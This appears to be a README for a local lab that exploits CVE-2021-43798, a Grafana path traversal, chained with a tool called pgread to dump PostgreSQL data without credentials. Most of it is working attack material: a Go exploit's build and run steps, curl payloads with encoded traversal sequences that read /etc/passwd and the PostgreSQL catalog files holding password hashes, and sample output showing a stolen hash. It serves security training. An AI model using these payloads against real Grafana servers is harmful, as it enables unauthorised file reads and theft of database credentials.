# CVE-2021-43798 + pgread Lab

**Grafana Path Traversal → Dump PostgreSQL without credentials**

## Setup

```bash
docker compose up -d
```

## Exploit (Go)

```bash
cd exploit
go build -o exploit .
./exploit http://localhost:13000
```

Output:

```json
{
  "credentials": [
    "admin:SCRAM-SHA-256$4096:..."
  ],
  "databases": {
    "postgres": [
      "sql_features (755 rows)"
    ]
  }
}
```

## Manual

```bash
# 1. Test path traversal
curl "http://localhost:13000/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd"

# 2. Dump pg_database
curl "http://localhost:13000/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fvar/lib/postgresql/data/global/1262" -o 1262
pgread -f 1262

# 3. Dump password hashes
curl "http://localhost:13000/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fvar/lib/postgresql/data/global/1260" -o 1260
pgread -f 1260
```

## Impact

| Before pgread | With pgread |
|---------------|-------------|
| Path Traversal = Medium | Path Traversal = **Critical** |
| "I can read /etc/passwd" | "I dumped all password hashes and database contents" |
